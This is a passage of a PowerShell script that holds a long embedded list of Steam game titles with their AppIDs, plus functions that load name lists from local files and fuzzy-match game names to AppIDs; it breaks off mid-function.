Hidden Through Time (524910)
High Strategy: Urukon (1254870)
Hitman: Absolution(TM) (203140)
Hogwarts Legacy (990080)
Hollow Knight (367520)
Hollow Knight: Silksong (1030300)
Homefront (55100)
Horizon Chase Turbo (389140)
Horizon Forbidden West(TM) Complete Edition (2420110)
Horizon Zero Dawn(TM) Complete Edition (1151640)
Hotel Giant (502460)
Hotel Giant 2 (38230)
Hotline Miami 2: Wrong Number (274170)
House Flipper (613100)
House Flipper 2 (1190970)
House Flipper Remastered Collection (3710840)
Human Fall Flat (477160)
Hunting Simulator 2 (1135910)
Hunting Unlimited 2010 (12690)
HYPER DEMON (1743850)
Hyper Light Drifter (257850)
I Am Gangster (1877830)
Icewind Dale: Enhanced Edition (321800)
Idle Champions of the Forgotten Realms (627690)
Idle Wizard (992070)
IdleOn - The Incremental MMO (1476970)
Incredible Dracula 4: Games Of Gods (1092510)
Indie Dream (612060)
Indie Game: The Movie (207080)
Industry Giant 2 (271360)
Infinity Kingdom (1573360)
Inscryption (1092790)
INSIDE (304430)
Internet Cafe Simulator 2 (1563180)
Into the Breach (590380)
Ion Fury (562860)
Island, Sex & Survival (2911250)
Istanbul Ship Simulator (1824210)
Jazzpunk: Director's Cut (250260)
Jigsaw Puzzle Dreams (1653970)
JoJo's Bizarre Adventure: All-Star Battle R (1372110)
Journey (638230)
JR EAST Train Simulator (2111630)
Judgment: Apocalypse Survival Simulation (455980)
Jujutsu Kaisen Cursed Clash (1877020)
Jungle Rumble (1608210)
Jurassic World Evolution 2 (1244460)
Jusant (1977170)
Just Cause (6880)
Just Cause 2 (8190)
Just Cause 4 Reloaded (517630)
Just Cause(TM) 3 (225540)
Katana ZERO (460950)
Kaze and the Wild Masks (829280)
Kena: Bridge of Spirits (1954200)
Kenshi (233860)
Kentucky Route Zero: PC Edition (231200)
Kerbal Space Program 2 (954850)
Keyboard Soldier (3178910)
Keylocker | Turn Based Cyberpunk Action (1325040)
Killing Floor (1250)
Kingdom Come: Deliverance (379430)
Kingdom Come: Deliverance II (1771300)
KINGDOM HEARTS -HD 1.5+2.5 ReMIX- (2552430)
KINGDOM HEARTS III + Re Mind (DLC) (2552450)
Kingdom Two Crowns (701160)
Knight Eternal (1165180)
Knight Online (389430)
Knights of Honor (25830)
Knights of Honor II: Sovereign (736820)
Knytt Underground (248190)
L.A. Noire (110800)
Lamplight City (761460)
Last Hope Bunker: Zombie Survival (2475440)
Layers of Fear (2016) (391720)
Le Mans Ultimate (2399420)
Left 4 Dead (500)
Left 4 Dead 2 (550)
LEGO(R) Batman(TM) 3: Beyond Gotham (313690)
LEGO(R) DC Super-Villains (829110)
LEGO(R) Jurassic World (352400)
LEGO(R) Marvel Super Heroes 2 (647830)
LEGO(R) Marvel(TM) Super Heroes (249130)
LEGO(R) Star Wars(TM) - The Complete Saga (32440)
LEGO(R) Star Wars(TM): The Skywalker Saga (920210)
LEGO(R) The Hobbit(TM) (285160)
LEGO(R) The Incredibles (818320)
LiDAR Exploration Program (1882190)
Lies of P (1627720)
Life is Strange - Episode 1 (319630)
Life is Strange 2 (532210)
Life is Strange: Double Exposure (1874000)
LIGHTNING RETURNS(TM): FINAL FANTASY(R) XIII (345350)
LIMBO (48000)
Lisa Total investigation! (2691470)
Little Nightmares (424840)
Little Nightmares II (860510)
Little Nightmares III (1392860)
Lobotomy Corporation | Monster Management Simulation (568220)
Loop Hero (1282730)
Lords of the Fallen (1501750)
Lords Of The Fallen(TM) 2014 (265300)
Lossless Scaling (993090)
Lost and Found Co. (2101390)
Lost Ark (1599340)
Lost Castle 2 (2445690)
Lost Judgment (2058190)
Love Spell: Written In The Stars - a magical romantic-comedy otome (1250520)
Lushfoil Photography Sim (1749860)
Lust Goddess (2808930)
Mad Max (234140)
Mafia (40990)
Mafia II (Classic) (50130)
Mafia II: Definitive Edition (1030830)
Mafia III: Definitive Edition (360430)
Mafia: The Old Country (1941540)
Martial Arts Brutality (618080)
MARVEL Puzzle Quest (234330)
Marvel's Spider-Man 2 (2651280)
Marvel's Spider-Man Remastered (1817070)
Marvel's Spider-Man: Miles Morales (1817190)
Mary Le Chef - Cooking Passion (588620)
Mass Effect (2007) (17460)
Mass Effect(TM) Legendary Edition (1328670)
Master Detective Archives: RAIN CODE Plus (2903950)
Max Payne (12140)
Max Payne 2: The Fall of Max Payne (12150)
MechWarrior 5: Clans (2000890)
MechWarrior 5: Mercenaries (784080)
Medieval Dynasty (1129580)
METAL GEAR RISING: REVENGEANCE (235460)
METAL GEAR SOLID V: THE PHANTOM PAIN (287700)
Metel - Horror Escape (1357870)
Metro 2033 Redux (286690)
Metro Exodus (412020)
Metro: Last Light Redux (287390)
Miasma Chronicles (1649010)
Microsoft Flight Simulator (2020) 40th Anniversary Edition (1250410)
Microsoft Flight Simulator 2024 (2537590)
Microsoft Flight Simulator X: Steam Edition (314160)
Middle-earth(TM): Shadow of War(TM) (356190)
Midnight Heist (2204350)
MindsEye (3265250)
Minecraft Dungeons (1672970)
Mirror's Edge(TM) (17410)
Mirror's Edge(TM) Catalyst (1233570)
Mist Survival (914620)
Modern Pink Elf RPG (2745710)
Monster Hunter Stories 3: Twisted Reflection (2852190)
Monster Train (1102190)
MOON BASE (1506410)
Mortal Kombat X (307780)
Mortal Kombat: Legacy Kollection (3454980)
Mortal Kombat 11 (976310)
Mosaic: Game of Gods (547390)
Mosaic: Game of Gods II (840240)
Moss: The Forgotten Relic  (3914860)
Move or Die (323850)
Mudborne: Frog Management Sim (2355150)
MX vs ATV Legends (1205970)
My Demon Family (2901060)
My Friend Pedro (557340)
My Lovable Demon (3854420)
Mystery Island - Hidden Object Games (1107620)
Mystery Island:Missing Amy (3439040)
Mystery IslandEnigmatic Painting (3779920)
Myth of Empires (1371580)
Mythic Love: Iberian Legends (2654990)
Mythology Waifus Mahjong (2277840)
Nancy Drew(R): Message in a Haunted Mansion (615770)
NARUTO X BORUTO Ultimate Ninja STORM CONNECTIONS (1020790)
Need For Speed: Hot Pursuit (47870)
Need for Speed(TM) (1262540)
Need for Speed(TM) Heat (1222680)
Need for Speed(TM) Hot Pursuit Remastered (1328660)
Need for Speed(TM) Most Wanted (1262560)
Need for Speed(TM) Payback (1262580)
Need for Speed(TM) Rivals (1262600)
Need for Speed(TM) Unbound (1846380)
Neon Abyss (788100)
Neon Abyss 2 (2235200)
Neon Chrome (428750)
Neon Inferno (2957720)
Neon Sundown (1721870)
Neon White (1533420)
Neverwinter Nights: Enhanced Edition (704450)
NieR Replicant(TM) ver.1.22474487139... (1113560)
NieR:Automata(TM) (524220)
Night in the Woods (481510)
Nightmare Reaper (1051690)
Nine Worlds - A Viking saga (700460)
Ninja Stealth (485450)
Ninja Stealth 2 (585830)
Ninja Stealth 3 (754120)
Ninja Stealth 4 (1711840)
Ninja Stealth 5 (2950000)
Ninja: Shadow of the Dash (3126050)
Nioh 2 - The Complete Edition (1325200)
Nioh: Complete Edition (485510)
No Man's Sky (275850)
No Socks RPG (4929970)
NoLimits 2 Roller Coaster Simulation (301320)
Northern Journey (1639790)
Oasis Mission: Colony Sim (2658640)
Observer: System Redux (1386900)
Occupational Hazards: Episode 1 (1148980)
OCTOPATH TRAVELER II (1971650)
OCTOPATH TRAVELER(TM) (921570)
Office Management 101 (678390)
On Air Island : Survival Chat (2562510)
ONE PIECE ODYSSEY (814000)
Onimusha 2: Samurai's Destiny (3046600)
Orc Covenant: Gay Bara Orc Visual Novel (2243570)
Orc Massage (1129540)
Ori and the Blind Forest (261570)
Ori and the Blind Forest: Definitive Edition (387290)
Ori and the Will of the Wisps (1057090)
Original War (235320)
Outer Wilds (753640)
Outlast (238320)
Outlast 2 (414700)
Overcooked (448510)
Overcooked! 2 (728880)
Overcooked! All You Can Eat (1243830)
Owlboy (115800)
Oxenfree (388880)
Pacific Drive (1458140)
Papers, Please (239030)
Passant: A Chess Roguelike (3353100)
Path of Idle: Old Gods Rising (4243990)
PAYDAY 3 (1272080)
PAYDAY(TM) The Heist (24240)
PC Building Simulator (621060)
PEAK (3527290)
Pechka: Historical Story Adventure (2210700)
PEPPERED: an existential platformer (1883370)
Perfect Heist 2 (1521580)
Persona 4 Golden (1113000)
Persona 5 Royal (1687950)
Persona(R) 5 Strikers (1382330)
Phasmophobia (739630)
Physics Lab (2167340)
Pillars of Eternity (291650)
Pillars of Eternity II: Deadfire (560130)
Pipistrello and the Cursed Yoyo (2870350)
Pizza Tower (2231450)
Planescape: Torment: Enhanced Edition (466300)
Planet Coaster (493340)
Planet Zoo (703080)
Plants vs. Zombies(TM): Replanted (3654560)
Political Arena (1670920)
Poly Bridge (367450)
Poly Bridge 2 (1062160)
Portal (400)
Portal 2 (620)
Portal Stories: Mel (317400)
POSTAL 2 (223470)
Potato Thriller (486650)
Potion Craft: Alchemist Simulator (1210320)
PowerWash Adventure (2699660)
PowerWash Adventure VR (2589440)
PowerWash Simulator (1290000)
PowerWash Simulator 2 (2968420)
PRAGMATA (3357650)
Pretty Angel (1148510)
Prey (3970)
Prey (480490)
Prey with Gun  (718940)
Prey: Typhon Hunter (741820)
Prince of Persia(R) (19980)
Prison Escape Simulator (3507120)
Prison Escape Simulator: Dig Out (3672720)
Private Military Manager: Tactical Auto Battler (2564320)
Prodeus (964800)
Project Warlock (893680)
Project Zomboid (108600)
Prototype 2 (115320)
Prototype(TM) (10150)
Punch Club (394310)
Pupperazzi: The Dog Photography Game (1028350)
Puzzle Pirates (99910)
Puzzle Quest: Immortal Edition (3236710)
Quake (2310)
Quake II (2320)
Quantum Break (474960)
Quantum Odyssey (2802710)
Quest of Dungeons (270050)
RACCOIN: Coin Pusher Roguelike (3784030)
Raft (648800)
RAID: Shadow Legends (2333480)
RAIDOU Remastered: The Mystery of the Soulless Army (2288350)
Railway Empire 2 (1644320)
Rain World (312520)
Rayman(R) Legends (242550)
Ready or Not (1144200)
Realistic Ragdoll Sandbox (3048280)
Reclaiming the Lost (3112280)
Record of Lodoss War-Deedlit in Wonder Labyrinth- (1203630)
Red Dead Redemption (2668510)
Red Dead Redemption 2 (1174180)
Red Faction Guerrilla Re-Mars-tered (667720)
Reentry - A Space Flight Simulator (882140)
Reigns (474750)
Relicta (941570)
REMNANT II(R) (1282100)
Remnant: From the Ashes (617290)
Rescue Dash - Management Puzzle (2254000)
Rescue Team 5 (416320)
Resident Evil 0 (339340)
Resident Evil 2 (883710)
Resident Evil 3 (952060)
Resident Evil 7 Biohazard (418370)
Resident Evil Revelations (222480)
Resident Evil Revelations 2 (287290)
Resident Evil Village (1196590)
Retro Arcade Shop Simulator (4010900)
Retro Gadgets (1730260)
Retro Rewind - Video Store Simulator (3552140)
RetroMania Wrestling (1252300)
Return of the Obra Dinn (653530)
Return to Castle Wolfenstein (9010)
Returnal(TM) (1649240)
Revenge of the shadow ninja (2364970)
Rhythm Any Music (2153280)
RIDE 6 (2815070)
Rift Wizard (1271280)
Rift Wizard 2 (2058570)
RimWorld (294100)
Rise of the Tomb Raider(TM) (391220)
Risk of Rain 2 (632360)
Risk of Rain Returns (1337520)
Robbery Bob: Man of Steal (372960)
Robot Exploration Squad (393600)
Roman Triumph: Survival City Builder (1864880)
RuneScape: Dragonwilds (1374490)
Russian Fishing 4 (766570)
Ryse: Son of Rome (302510)
s&box (590830)
Sable (757310)
Saints Row (742420)
Saints Row 2 (9480)
Saints Row(R): The Third(TM) Remastered (978300)
Salt and Sanctuary (283640)
Sandbox World (1831480)
Satisfactory (526870)
Save Giant Girl from monsters (2771860)
Save Giant Girl from monsters 2 (2830670)
Save Giant Girl from monsters 4 (2830690)
SCARLET NEXUS (775500)
Scary Hospital Horror Game (1343580)
Schedule I (3164500)
Scorn (698670)
Secret Cats - Haunted Mansion (3284640)
Sekiro(TM): Shadows Die Twice - GOTY Edition (814380)
Serious Sam Classic: The First Encounter (41050)
Serious Sam Classic: The Second Encounter (41060)
Serious Sam Classics: Revolution (227780)
Sex Trainer's Diary: Hidden Kink (4218020)
Sex, Secrets & Used Tech (3576350)
Sex-Pop Demon Hunters (4355490)
Shadow Gambit: The Cursed Crew (1545560)
Shadow Ninja: Apocalypse (389160)
Shadow of the Ninja - Reborn (2543760)
Shadow of the Tomb Raider: Definitive Edition (750920)
Shadow Tactics: Blades of the Shogun (418240)
Shadow Warrior (233130)
Shadow Warrior 2 (324800)
Shashingo: Learn Japanese with Photography (1632490)
Shin Megami Tensei V: Vengeance (1875830)
Ship Simulator: Maritime Search and Rescue (274010)
Shiren the Wanderer: The Mystery Dungeon of Serpentcoil Island (2178480)
Shop Titans (1258080)
Shovel Knight: Treasure Trove (250760)
Sigma Theory: Global Cold War (716640)
SIGNALIS (1262350)
Silent: Abandoned (3108720)
Singularity(TM) (42670)
Sins of a Solar Empire II (1575940)
Sir, We Have an Orc Problem (4594150)
SkateBIRD (971030)
Skelethrone: The Prey (2139870)
Slain: Back from Hell (369070)
Slay the Princess - The Pristine Cut (1989270)
Slay the Spire (646570)
Sleeping Dogs: Definitive Edition (307690)
Slime Rancher (433340)
Slime Rancher 2 (1657630)
Small Saga (1320140)
Sniper Elite 4 (312660)
Sniper Ghost Warrior Contracts (973580)
Sniper Ghost Warrior Contracts 2 (1338770)
Snoopy & The Great Mystery Club (3328180)
Solace Crafting (670260)
Solar Expanse - Space Exploration Manager (1369700)
Solasta: Crown of the Magister (1096530)
Soldier Warfare (1352520)
Solo Leveling: ARISE OVERDRIVE (2373990)
SOMA (282140)
Sonic Adventure 2 (213610)
Sonic Frontiers (1237320)
Sons Of The Forest (1326470)
South Park(TM): The Fractured But Whole(TM) (488790)
Space Colony: Steam Edition (297920)
Space Engineers (244850)
Space Engineers 2 (1133870)
Space Rescue: Code Pink (1407210)
Space Simulation Toolkit (1196080)
Space Station 51 (1426570)
Space Station Alpha (341930)
Spaceland: Sci-Fi Indie Tactics (1021070)
Spec Ops: The Line (50300)
Spelunky (239350)
Spelunky 2 (418530)
Sphinx and the Cursed Mummy (606710)
Spiral Dystopia (1933680)
Spirit City: Lofi Sessions (2113850)
Spitfire - Moonpies Mission (3339350)
Split Fiction (2001120)
Squad (393380)
Stacks:Jungle! (2522060)
Staffer Case: A Supernatural Mystery Adventure (2128480)
Star Chef 2: Cooking Game (1612810)
Star Knight: Order of the Vortex (2462090)
STAR WARS Jedi: Fallen Order(TM) (1172380)
STAR WARS Jedi: Survivor(TM) (1774580)
STAR WARS(TM) - The Force Unleashed(TM) Ultimate Sith Edition (32430)
STAR WARS(TM) Battlefront(TM) II (1237950)
STAR WARS(TM) Empire at War - Gold Pack (32470)
STAR WARS(TM) Jedi Knight - Jedi Academy(TM) (6020)
STAR WARS(TM) Knights of the Old Republic(TM) (32370)
STAR WARS(TM) Republic Commando(TM) (6000)
Starbound (211820)
Stardew Valley (413150)
Stealth Bastard Deluxe (209190)
Stealth Labyrinth (450040)
SteamWorld Heist (322190)
SteamWorld Heist II (2396240)
Stellar Blade(TM) (3489700)
Stormworks: Build and Rescue (573090)
Story Of the Survivor (440950)
Story of the Survivor : Prisoner (676210)
Storyteller (1624540)
Stray (1332010)
StrongestAngel Zerachiel! (2804550)
Stronghold Crusader HD (2012) (40970)
Submerged: Hidden Depths (1614270)
Subnautica (264710)
Subnautica 2 (1962700)
Subnautica: Below Zero (848450)
Succubus Successor: Delilah's Juicy Journey (3628950)
Suicide Squad: Kill the Justice League (315210)
Sunset Overdrive (847370)
Super Indie Karts (323670)
Superflight (732430)
SUPERHOT (322500)
Superliminal (1049410)
Supermarket Simulator (2670630)
SuperSmash: Physics Battle (1077290)
Supraland (813630)
Surf Sandbox (4480760)
Survival Log (4164790)
Syberia (46500)
Syberia 3 (464340)
Syberia II (46510)
Syberia: The World Before (1410640)
Symphony of War: The Nephilim Saga (1488200)
System Shock (482400)
System Shock 2: 25th Anniversary Remaster (866570)
System Shock: Enhanced Edition (410710)
System Shock(R) 2 (1999) (238210)
Tactical Assault VR (2314160)
Tactical Breach Wizards (1043810)
Tails of Iron (1283410)
Take On Helicopters (65730)
Tales from the Borderlands (330830)
Tales of ARISE (740130)
Tales of Berseria(TM) (429660)
Tales of Zestiria (351970)
TDS - Tower Defense Strategy (2392280)
Terraria (105600)
Tesla vs Lovecraft (636100)
The 1500 Year Old Forest Elf and My Anti-Materiel Sniper Rifle (3761830)
The Abandoned Planet (2014470)
The Adventures of Elliot: The Millennium Tales (3483510)
The Ascent (979690)
The Binding of Isaac (113200)
The Binding of Isaac: Rebirth (250900)
The Boss Gangster: Criminal Empire (2774040)
The Commission 1920: Organized Crime Grand Strategy (1330960)
The Crew(TM) (241560)
The Dark Eye: Memoria (243200)
The Dark Pictures Anthology: Man of Medan (939850)
The Darkside Detective (368390)
The Elder Scrolls III: Morrowind(R) Game of the Year Edition (22320)
The Elder Scrolls IV: Oblivion(R) Game of the Year Edition (2009) (22330)
The Elder Scrolls V: Skyrim Special Edition (489830)
The Enjenir: The Engineering Physics Building Simulator (1800940)
The Escapists 2 (641990)
The Evil Within (268050)
The Evil Within 2 (601430)
The First Berserker: Khazan (2680010)
The Fishing Club 3D: Co-op Sport Angling (522230)
The Forest (242760)
The Forgotten City (874260)
The Great Ace Attorney Chronicles (1158850)
The Great Villainess: Strategy of Lily (2454960)
The Horror at Highrook (2836860)
The House in Fata Morgana (303310)
The Last Campfire (990630)
The Last of Us(TM) Part I (1888930)
The Last Werewolf (2212520)
The Legend of Heroes: Trails of Cold Steel (538680)
The Legend of Heroes: Trails of Cold Steel II (748490)
The Legend of Heroes: Trails of Cold Steel III (991270)
The Legend of Heroes: Trails of Cold Steel IV (1198090)
The Legend of Khiimori (2697000)
The Long Dark (305620)
The Medium (1293160)
The Messenger (764790)
The Monstrous Horror Show (2099790)
The Murder of Sonic the Hedgehog (2324650)
The Mystery of Bikini Island (1064060)
The Saboteur(TM) (24880)
The Sandbox (265810)
The Secret Atelier (2799690)
The secret pyramid VR (2171010)
The Sims(TM) 4 (1222670)
The Stanley Parable: Ultra Deluxe (1703340)
The Surge (378540)
The Surge 2 (644830)
The Talos Principle (257510)
The Talos Principle 2 (835960)
The Walking Dead: Season Two (261030)
The Witcher 3: Wild Hunt - Complete Edition (292030)
theHunter: Call of the Wild(TM) (518790)
There Are No Orcs (3480990)
Thief (239160)
Thief Simulator (704850)
Thief Simulator 2 (1332720)
Third Crisis: Neon Nights (3400350)
This War of Mine (282070)
Timeflow - Life Sim (1005930)
Tinykin (1599020)
Titan Chaser (1290170)
Titan Quest Anniversary Edition (475150)
Titan Quest II (1154030)
Titan Souls (297130)
Titan Station (1881120)
Titanfall(R) 2 (1237970)
TITANIC Shipwreck Exploration (924800)
Titanic: Fall Of A Legend (1835200)
Toilet Management Simulator (1361860)
Tom Clancy's Ghost Recon: Future Soldier(TM) (212630)
Tom Clancy's Ghost Recon(R) Breakpoint (2231380)
Tom Clancy's Ghost Recon(R) Wildlands (460930)
Tom Clancy's Rainbow Six Siege (359550)
Tom Clancy's Rainbow Six(R) 3 Gold (19830)
Tom Clancy's Splinter Cell Blacklist (235600)
Tomb Raider Game of the Year (203160)
Toodee and Topdee (1303950)
Torchlight (41500)
Torchlight II (200710)
Torment: Tides of Numenera (272270)
Tormented Souls (1367590)
Tornado: Research and Rescue (2250550)
Total War: MEDIEVAL II - Definitive Edition (4700)
Total War: THREE KINGDOMS (779340)
Totally Accurate Battle Simulator (508440)
Tower Wizard (3372980)
Traffic Giant (672710)
Train Simulator Classic (24010)
Tranquility Base Mining Colony: The Moon - Explorer Version (873740)
Trash Horror Collection (2017370)
TRIANGLE STRATEGY (1850510)
TROUBLESHOOTER: Abandoned Children (470310)
TUNIC (553420)
Turn Based Boxing: Tactics - Legends Edition (2990450)
Turok (405820)
Turok 2: Seeds of Evil (405830)
Tyranny (362960)
TYRONE vs COPS (1853200)
UberSoldier II (281410)
Ultimate Custom Night (871720)
Ultimate Fishing Simulator(R) (468920)
Ultimate Fishing(R) Simulator 2 (1136380)
ULTRAKILL (1229490)
UNCHARTED(TM): Legacy of Thieves Collection (1659420)
Undead Citadel (819190)
Undead Development (682140)
Undead Horde (790850)
Undead Horde 2: Necropolis (2065810)
Underground Blossom (2291850)
Underground Garage (1452250)
Undertale (391540)
Unforeseen Incidents (501790)
Universe Sandbox (230290)
Unpacking (1135690)
Unravel (1225560)
Unravel Two (1225570)
Unreal Physics (2837320)
Ur Game: The Game of Ancient Gods (1324870)
Urban Jungle (2744010)
Urban Myth Dissolution Center (2089600)
Urbek City Builder (1411740)
Utopia City (3341440)
Utopia Must Fall (2849680)
V.O.D.K.A. Open World Survival Shooter (1513840)
Valheim (892970)
Valkyria Chronicles 4 Complete Edition (790820)
Vampire Crawlers: The Turbo Wildcard from Vampire Survivors (3265700)
Vampire Hunter: Nightrise (4043730)
Vampire Survivors (1794680)
Vampire: The Masquerade - Bloodlines (2600)
Vampire: The Masquerade - Night Road (1290270)
Vampire: The Masquerade(R) - Bloodlines(TM) 2 (532790)
Vanquish (460810)
Viking Saga: The Cursed Ring (415390)
Violent Horror Stories 2 (3636960)
Viscerafest (1406780)
VR Hentai Simulation (2406200)
VR Prison Escape (1566700)
Wagotabi: A Japanese Journey (2701720)
Wallpaper Engine (431960)
Waltz of the Wizard (1094390)
Warbox Sandbox (2050680)
Warframe (230410)
Warrior of Lust (4032770)
Wartales (1527950)
Wasteland 2: Director's Cut (240760)
Wasteland 3 (719040)
Watch Dogs(R): Legion (2239550)
Watch_Dogs(R) 2 (447040)
Watch_Dogs(TM) (243470)
Water Physics Simulation (1692620)
Werewolf: The Apocalypse - Earthblood (679110)
Werewolf: The Apocalypse - Purgatory (2463980)
What Remains of Edith Finch (501300)
Where Winds Meet (3564740)
WILD HEARTS(TM) (1938010)
Wildermyth (763890)
Wings of Prey: Special Edition (45300)
Witch Hunt (661790)
Witch of the Space Station (2820960)
Wizard with a Gun (1150530)
Wizardry Variants Daphne (2379740)
Wo Long: Fallen Dynasty (1448440)
Wolfenstein II: The New Colossus (612880)
Wolfenstein: The New Order (201810)
Wolfenstein: The Old Blood (350080)
Wolfenstein: Youngblood (1056960)
WolfQuest: Anniversary Edition (926990)
Word Rescue (358340)
WORLD OF HORROR (913740)
World Ship Simulator (403980)
WorldBox - God Simulator (1206560)
WRATH: Aeon of Ruin (1000410)
X4: Foundations (392160)
XCOM: Enemy Unknown (200510)
XCOM(R) 2 (268500)
Yakuza 0 (638970)
Yakuza 3 Remastered (1088710)
Yakuza 4 Remastered (1105500)
Yakuza 5 Remastered (1105510)
Yakuza Kiwami (Legacy) (834530)
Yakuza Kiwami 2 (Legacy) (927380)
Yakuza: Like a Dragon (1235140)
Yet Another Zombie Survivors (2163330)
You Are Grounded (3161920)
Ys IX: Monstrum Nox (1351630)
Ys VIII: Lacrimosa of DANA (579180)
Zombie Survival Game Online (2268560)
Zombie Survival online (1605960)
Zomby Soldier (769340)
Game 2465870 (2465870)
 -Japanese House Exploration- (3053390)
 Elf Girl Pinball (2074890)
-Lucky Zombie Survival (3682530)
Alien: Isolation (214490)
Antichamber (219890)
Assassin's Creed Valhalla (2208920)
Assassin's Creed III (208480)
Batman: Arkham Knight (208650)
Batman: Arkham Origins (209000)
Blasphemous 2 (2114740)
Buckshot Roulette (2835570)
Call of Duty: Advanced Warfare (209650)
Call of Duty: Ghosts (209160)
COCOON (1497440)
Crysis 2 Remastered (2096600)
Crysis 3 Remastered (2096610)
DAVE THE DIVER (1868140)
Dishonored (205100)
DOOM 3: BFG Edition (208200)
Dragon's Dogma 2 (2054970)
DREDGE (1562430)
F.E.A.R. (21090)
F.E.A.R. 3 (21100)
Fable - The Lost Chapters (204030)
Far Cry 3 (220240)
FTL: Faster Than Light (212680)
Ghost of Tsushima DIRECTOR'S CUT (2215430)
Ghostrunner 2 (2144740)
Grim Dawn (219990)
Half-Life 2 (220)
Hotline Miami (219150)
Immortals Fenyx Rising (2221920)
Judgment (2058180)
Kerbal Space Program (220200)
LEGO Batman 2: DC Super Heroes (213330)
LEGO Batman: Legacy of the Dark Knight (2215200)
LEGO Batman: The Videogame (21000)
LEGO Harry Potter: Years 1-4 (21130)
LEGO The Lord of the Rings (214510)
Max Payne 3 (204100)
Mouthwashing (2475490)
Nine Sols (1809540)
Party of Sin (212700)
PAYDAY 2 (218620)
Persona 3 Reload (2161700)
Quake 4 (2210)
Quake III Arena (2200)
Resident Evil 4 (2050650)
Resident Evil 5 (21690)
Resident Evil 6 (221040)
Resident Evil Requiem (3764200)
Saints Row IV (206420)
Sifu (2138710)
SILENT HILL 2 (2124490)
South Park: The Stick of Truth (213670)
SpaceEngine (314650)
The Walking Dead (207610)
The Witcher 2: Assassins of Kings Enhanced Edition (20920)
The Witness (210970)
Thief Gold (211600)
Vindictus (212160)
'@

$script:GAME_NAME_BY_APPID = $null
$script:GAME_APPID_BY_NAME = $null
$script:GAME_APPID_LIST = $null
function Initialize-GameNameMap {
    if ($script:GAME_NAME_BY_APPID) { return }
    $byId = @{}
    $byName = @{}
    $order = New-Object System.Collections.ArrayList
    $raw = $null
    $cand = @()
    try { if ($PSScriptRoot) { $cand += (Join-Path $PSScriptRoot 'lua_nombres_1173_final.txt') } } catch {}
    try { $cand += (Join-Path $env:LOCALAPPDATA 'BastissSteam\lua_nombres_1173_final.txt') } catch {}
    try { $cand += (Join-Path ([Environment]::GetFolderPath('Desktop')) 'lua_nombres_1173_final.txt') } catch {}
    $files = @()
    foreach ($c in $cand) {
        if ($c -and (Test-Path -LiteralPath $c)) { $files += $c }
    }
    try { $cacheFile = (Join-Path $env:LOCALAPPDATA 'BastissSteam\lua_nombres_cache.txt'); if (Test-Path -LiteralPath $cacheFile) { $files += $cacheFile } } catch {}
    $raw = ''
    foreach ($fx in $files) { try { $raw += "`n" + [System.IO.File]::ReadAllText($fx) } catch {} }
    if (-not $raw.Trim()) { $raw = $script:GAME_NAME_DATA }
    foreach ($line in ($raw -split "`r?`n")) {
        $line = $line.Trim()
        if (-not $line) { continue }
        $m = [regex]::Match($line, '^(.*?)\s*\((\d+)\)\s*$')
        if (-not $m.Success) { continue }
        $nm = $m.Groups[1].Value.Trim()
        $id = $m.Groups[2].Value
        if (-not $id -or -not $nm) { continue }
        if (($nm -match '\(no data\)') -and $byId.ContainsKey($id)) { continue }
        if (-not $byId.ContainsKey($id)) { [void]$order.Add($id) }
        $byId[$id] = $nm
        $key = Nn1Yw $nm
        if ($key -and -not $byName.ContainsKey($key)) { $byName[$key] = $id }
    }
    $script:GAME_NAME_BY_APPID = $byId
    $script:GAME_APPID_BY_NAME = $byName
    $script:GAME_APPID_LIST = @($order)
}
function Get-GameNameByAppId([string]$appid) {
    if (-not $script:GAME_NAME_BY_APPID) { Initialize-GameNameMap }
    $k = [string]$appid
    if ($k -and $script:GAME_NAME_BY_APPID.ContainsKey($k)) { $nn = $script:GAME_NAME_BY_APPID[$k]; if ($nn -and ($nn -notmatch '\(no data\)')) { return $nn } }
    return "Juego $k"
}
function Get-NameAliasTokens([string]$tok) {
    switch ($tok) {
        'gta' { return @('grand','theft','auto') }
        'cod' { return @('call','of','duty') }
        'gow' { return @('god','of','war') }
        'nfs' { return @('need','for','speed') }
        'mgs' { return @('metal','gear','solid') }
        're'  { return @('resident','evil') }
        default { return @() }
    }
}
function Find-AppIdByName([string]$text) {
    if (-not $script:GAME_APPID_BY_NAME) { Initialize-GameNameMap }
    if ([string]::IsNullOrWhiteSpace($text)) { return $null }
    $q = Nn1Yw $text
    if (-not $q) { return $null }
    if ($script:GAME_APPID_BY_NAME.ContainsKey($q)) { return $script:GAME_APPID_BY_NAME[$q] }
    $qArgs = @($q -split '\s+' | Where-Object { $_ })
    if ($qArgs.Count -eq 0) { return $null }
    $qDigits = @($qArgs | Where-Object { $_ -match '^\d+$' })
    $ignoreTok = @('edition','definitive','anniversary','complete','deluxe','ultimate','remastered','enhanced','goty','gold','collectors','the','of','a','an')
    $best = $null; $bestScore = -1
    foreach ($candKey in $script:GAME_APPID_BY_NAME.Keys) {
        $candToks = @($candKey -split '\s+' | Where-Object { $_ })
        if ($candToks.Count -eq 0) { continue }
        $usedIdx = New-Object 'System.Collections.Generic.HashSet[int]'
        $okQ = $true
        foreach ($qk in $qArgs) {
            $foundAt = -1
            for ($jA = 0; $jA -lt $candToks.Count; $jA++) { if ($usedIdx.Contains($jA)) { continue }; if ($candToks[$jA] -eq $qk) { $foundAt = $jA; break } }
            if ($foundAt -ge 0) { [void]$usedIdx.Add($foundAt); continue }
            $alToks = Get-NameAliasTokens $qk
            if ($alToks.Count -gt 0) {
                $alIdx = @(); $gotAll = $true
                foreach ($alTok in $alToks) {
                    $ai = -1
                    for ($jA = 0; $jA -lt $candToks.Count; $jA++) { if ($usedIdx.Contains($jA)) { continue }; if ($candToks[$jA] -eq $alTok) { $ai = $jA; break } }
                    if ($ai -lt 0) { $gotAll = $false; break }
                    $alIdx += $ai
                }
                if ($gotAll) { foreach ($xi in $alIdx) { [void]$usedIdx.Add($xi) }; continue }
            }
            $okQ = $false; break
        }
        if (-not $okQ) { continue }
        $lfOk = $true
        for ($jA = 0; $jA -lt $candToks.Count; $jA++) {
            if ($usedIdx.Contains($jA)) { continue }
            $lt = $candToks[$jA]
            if ($ignoreTok -contains $lt) { continue }
            if ($lt -match '^\d{4}$') { continue }
            if ($qDigits.Count -gt 0 -and $lt -match '^\d+$') { continue }
            $lfOk = $false; break
        }
        if (-not $lfOk) { continue }
        $score = 1000 - ($candToks.Count - $qArgs.Count)
        if ($score -gt $bestScore) { $bestScore = $score; $best = $script:GAME_APPID_BY_NAME[$candKey] }
    }
    return $best
}
function Search-AppIdsByName([string]$text) {
    if (-not $script:GAME_APPID_BY_NAME) { Initialize-GameNameMap }
    if ([string]::IsNullOrWhiteSpace($text)) { return @() }
    $q = Nn1Yw $text
    if (-not $q) { return @() }
